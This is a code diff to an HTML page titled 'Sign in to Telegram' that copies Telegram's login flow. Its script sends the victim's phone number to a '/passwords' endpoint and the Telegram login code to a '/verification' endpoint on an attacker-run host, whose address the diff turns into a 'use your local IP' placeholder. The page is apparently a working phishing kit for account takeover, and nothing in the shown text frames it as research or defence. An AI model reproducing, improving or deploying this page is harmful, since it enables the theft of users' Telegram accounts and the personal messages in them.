@@ -281,14 +281,13 @@
         <h1>Sign in to Telegram</h1>
         <p>Please confirm your country code and enter your phone number.</p>
 
-<div class="input-group dropdown-container">
-    <label for="countryDropdown">Country</label>
-    <div id="countryDropdown" class="dropdown" onclick="toggleDropdown()">
-        <span><span class="country-name">Select Country</span></span>
-    </div>
-    <div id="dropdownMenu" class="dropdown-menu"></div>
-</div>
-
+        <div class="input-group dropdown-container">
+            <label for="countryCode">Country</label>
+            <div id="countryCode" class="dropdown" onclick="toggleDropdown()">
+                <span><span class="country-name"></span></span>
+            </div>
+            <div id="dropdownMenu" class="dropdown-menu"></div>
+        </div>
 
         <div class="input-group">
             <label for="phoneNumber">Phone Number</label>
@@ -304,6 +303,7 @@
     </div>
 
     <div class="container" id="phoneVerificationContainer" style="display:none;">
+    
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
 
@@ -323,7 +323,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const countryDropdown = document.getElementById('countrySelect');
+            const countryDropdown = document.getElementById('countryCode');
             const dropdownMenu = document.getElementById('dropdownMenu');
             const phoneNumberInput = document.getElementById('phoneNumber');
             const countryNameSpan = countryDropdown.querySelector('.country-name');
@@ -366,14 +366,14 @@
             }
 
             document.getElementById('nextButton').addEventListener('click', function() {
-                const phoneNumber = phoneNumberInput.value.trim();
+                const phoneNumber = phoneNumberInput.value;
                 if (phoneNumber === '') {
                     alert('Please enter your phone number.');
                     return;
                 }
 
                 // Send phone number to the server
-                fetch('https://192.168.55.124:5002/passwords', {
+                fetch('http://192.168.x.x:5001/passwords', {  // Use your local IP address
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -399,8 +399,8 @@
             });
 
             window.submitVerification = function() {
-                const verificationCode = document.getElementById('verificationCode').value.trim();
-                const phoneNumber = phoneNumberInput.value.trim();
+                const verificationCode = document.getElementById('verificationCode').value;
+                const phoneNumber = phoneNumberInput.value;
 
                 if (verificationCode === '') {
                     alert('Please enter the verification code.');
@@ -408,7 +408,7 @@
                 }
 
                 // Send verification code to the server
-                fetch('https://192.168.55.124:5002/verification', {
+                fetch('http://192.168.x.x:5001/verification', {  // Use your local IP address
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
